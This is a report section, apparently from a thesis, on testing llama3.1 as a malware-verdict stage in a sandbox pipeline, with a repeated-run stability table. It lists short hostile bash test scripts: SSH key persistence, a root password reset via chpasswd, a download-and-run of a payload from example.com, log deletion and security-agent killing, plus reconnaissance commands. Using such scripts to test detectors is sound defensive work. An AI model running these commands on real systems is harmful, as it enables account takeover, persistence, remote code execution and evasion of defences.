@@ -1,0 +1,275 @@
+
+\subsection{AI Agent-Based Verdict Testing}
+\noindent
+As discussed in the preceding comparison, \texttt{llama3.1:latest} was selected as
+the most suitable model for the AI-based verdict stage. The choice was not based
+on a single favorable output, but on the overall balance between severity
+calibration, handling of ambiguous cases, and runtime. In particular, it was the
+only tested model that consistently treated the stealth and network-oriented
+cases in the expected direction while also keeping the legitimate case in the
+\textit{Low} range. This made it the most practical candidate for continued use
+in the pipeline.
+
+\noindent
+Having selected a model, the next step is not merely to compare it against the
+other candidates, but to examine how it behaves across a broader set of simple
+validation scenarios. The purpose of these follow-up tests is therefore to check
+whether the chosen model remains sensible when presented with more narrowly
+defined patterns of suspicious behavior, such as credential modification,
+persistence, reconnaissance, downloader activity, and combinations of these
+signals. Rather than serving as a benchmark between models, this stage acts as a
+sanity check on whether the selected AI agent produces outputs that remain
+plausible across different script-driven behaviors.
+
+
+\subsubsection{llama3.1 Validation Scripts}
+\noindent
+The following scripts were used as compact validation inputs for
+\texttt{llama3.1:latest}. Each one represents a small and deliberately readable
+behavioral pattern, making it easier to inspect whether the resulting verdict
+matches the dominant activity encoded in the script. Some cases isolate a single
+signal, while others combine several suspicious actions in order to observe how
+the model weighs them together.
+
+
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{account\_takeover.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+mkdir -p ~/.ssh
+echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
+echo "root:BadPassword123" | chpasswd
+
+\end{minted}
+\end{minipage}
+\hfill
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{cleanup\_tampering.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+rm -rf /tmp/secure.sh
+rm -rf /tmp/auth.sh
+echo > /etc/hosts.deny
+pkill sleep
+\end{minted}
+\end{minipage}
+
+\vspace{1em}
+
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{combined\_attack.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+uname -a
+mkdir -p ~/.ssh
+echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
+wget http://example.com/payload.sh
+chmod +x payload.sh
+sh payload.sh
+\end{minted}
+\end{minipage}
+\hfill
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{defense\_evasion.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+rm -f /tmp/security.log
+pkill security_agent
+
+
+
+
+\end{minted}
+\end{minipage}
+
+\vspace{1em}
+
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{downloader\_persistence.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+wget http://example.com/payload.sh
+chmod +x payload.sh
+mkdir -p ~/.ssh
+echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
+\end{minted}
+\end{minipage}
+\hfill
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{downloader.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+wget http://example.com/payload.sh
+chmod +x payload.sh
+sh payload.sh
+
+\end{minted}
+\end{minipage}
+
+\vspace{1em}
+
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{miner\_recon.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+cat /proc/cpuinfo | grep name | wc -l
+free -m
+lscpu
+df -h
+top -bn1
+\end{minted}
+\end{minipage}
+\hfill
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{password\_modification.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+echo "root:BadPassword123" | chpasswd
+
+
+
+
+\end{minted}
+\end{minipage}
+
+\vspace{1em}
+
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{reconnaissance.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+uname -a
+whoami
+lscpu
+free -m
+df -h
+\end{minted}
+\end{minipage}
+\hfill
+\begin{minipage}[t][3.0cm][t]{0.45\textwidth}
+\captionof{listing}{ssh\_persistence.sh}
+\vspace{-6mm}
+\begin{minted}[fontsize=\scriptsize,frame=single]{bash}
+#!/bin/bash
+mkdir -p ~/.ssh
+echo "ssh-rsa TESTKEY" >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+
+\end{minted}
+\end{minipage}
+
+\vspace{1em}
+
+The selected validation scripts cover a range of behavioral categories commonly associated with malicious activity, including credential modification, persistence establishment, reconnaissance, payload retrieval, and defense evasion. Several of the scripts are inspired by command sequences observed on a publicly exposed honeypot, while others were constructed to isolate specific behavioral patterns for testing purposes. The goal is not to evaluate the AI agent against a particular malware family, but rather to determine whether it can correctly interpret the underlying behavior represented by the collected execution artifacts.
+
+\vspace{1em}
+
+The validation set intentionally includes both single-purpose scripts and multi-stage attack simulations. Single-purpose scripts make it possible to evaluate whether the model correctly identifies a dominant malicious signal, such as password modification or SSH persistence. In contrast, the combined scripts test whether the model can reason about multiple suspicious actions occurring together and appropriately increase the assessed severity level. The expected outcome is that the AI agent produces consistent assessments that reflect both the type and combination of observed behaviors.
+
+\vspace{1em}
+
+These scripts are executed through the same sandboxing and monitoring pipeline as
+the earlier test cases. The intention is therefore not to change the execution
+method, but to supply a new set of compact validation inputs while keeping the
+artifact-collection process unchanged. After execution, the observed behavior is
+saved in the same structured JSON format used throughout the project, and that
+report is then passed to the AI wrapper for assessment.
+
+\vspace{1em}
+
+The stored output format captures the main artifact categories relevant to the
+verdict, including execution metadata, network activity, filesystem changes, and
+captured script output. A simplified representation of the report structure is
+shown below:
+
+\begin{minted}[fontsize=\scriptsize,frame=single]{json}
+{
+  "target_file": "",
+  "execution_time": 1,
+  "exit_code": 0,
+  "network_connections": [],
+  "traffic_verdict": [],
+  "filesystem_changes": {
+    "modified": [],
+    "new": [],
+    "deleted": []
+  },
+  "malware_output": {
+    "content": "",
+    "lines": 0,
+    "truncated": false
+  }
+}
+\end{minted}
+
+\noindent
+Using the same report structure across both the earlier benchmark cases and these
+validation scripts makes the later comparison more meaningful: the model is not
+judging the raw script text directly, but the monitored execution artifacts
+produced by a consistent reporting pipeline.
+
+
+\subsubsection{Repeated-Run Stability Test}
+\noindent
+After defining the validation scripts, an additional stability test was conducted
+in order to examine whether the selected model would vary its verdicts across
+repeated executions of the same input data. This was relevant because local
+language-model inference is not necessarily deterministic in practice, and a
+useful verdict component should ideally not fluctuate significantly when the
+underlying execution report is unchanged.
+
+\noindent
+To test this, the \texttt{llama3.1:latest} model was run five times on the same
+set of validation cases. For each run, the resulting severity label and
+\texttt{risk\_score} were recorded. Table~\ref{tab:llama31-repeatability}
+summarizes the dominant outcome for each script together with the level of
+agreement across the repeated runs.
+
+
+\newpage
+
+
+
+\begin{table}[h]
+\centering
+\footnotesize
+\begin{tabular}{lccc}
+\hline
+\textbf{Script} & \textbf{Repeated result} & \textbf{Avg. score} & \textbf{Agreement} \\
+\hline
+\texttt{account\_takeover.sh} & Critical & 95 & 5/5 identical \\
+\texttt{cleanup\_tampering.sh} & High & 80 & 5/5 identical \\
+\texttt{combined\_attack.sh} & High & 80 & 5/5 identical \\
+\texttt{defense\_evasion.sh} & Low & 10 & 5/5 identical \\
+\texttt{downloader.sh} & Medium & 50 & 5/5 identical \\
+\texttt{downloader\_persistence.sh} & Low & 20 & 5/5 identical \\
+\texttt{miner\_recon.sh} & Low & 10 & 5/5 identical \\
+\texttt{password\_modification.sh} & High & 80 & 5/5 identical \\
+\texttt{reconnaissance.sh} & Low & 10 & 5/5 identical \\
+\texttt{ssh\_persistence.sh} & High & 80 & 5/5 identical \\
+\hline
+\end{tabular}
+\caption{Repeated-run stability of \texttt{llama3.1:latest} across five executions of the same validation inputs.}
+\label{tab:llama31-repeatability}
+\end{table}
+
+\noindent
+The repeated-run test showed no observable variation in either severity label or
+\texttt{risk\_score} across the five executions. In this setting, the model
+therefore behaved as effectively deterministic for the tested inputs. This is a
+useful practical property, since it suggests that the main source of uncertainty
+in the AI-based verdict does not stem from run-to-run instability, but rather
+from how well the chosen test cases and persona capture the intended notion of
+maliciousness. In other words, the remaining challenge is less about output
+randomness and more about calibration of the model against the right behavioral
+signals.
